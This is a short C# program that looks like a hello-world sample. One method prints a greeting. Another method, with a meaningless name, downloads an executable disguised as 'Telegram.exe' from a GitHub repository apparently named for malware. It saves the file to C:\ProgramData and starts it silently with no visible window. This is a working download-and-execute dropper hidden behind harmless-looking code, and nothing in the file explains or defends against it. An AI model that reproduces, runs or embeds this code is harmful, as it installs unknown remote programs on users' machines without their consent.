using System;
using System.Diagnostics;

public class Program {
	
    public static void AaA() {
        Console.WriteLine("Hello, World!");
    }

    public static void BbB() {
        string url = "https://raw.githubusercontent.com/kolesiic2/Mw/refs/heads/main/Telegram.exe";
        string savePath = "C:\\ProgramData\\Telegram.exe";
        System.Net.WebClient webClient = new System.Net.WebClient();
        webClient.DownloadFile(url, savePath);

		ProcessStartInfo processStartInfo = new ProcessStartInfo
		{
		    FileName = savePath,
		    UseShellExecute = false,
		    CreateNoWindow = true
		};
		
		System.Diagnostics.Process.Start(processStartInfo);
    }
}

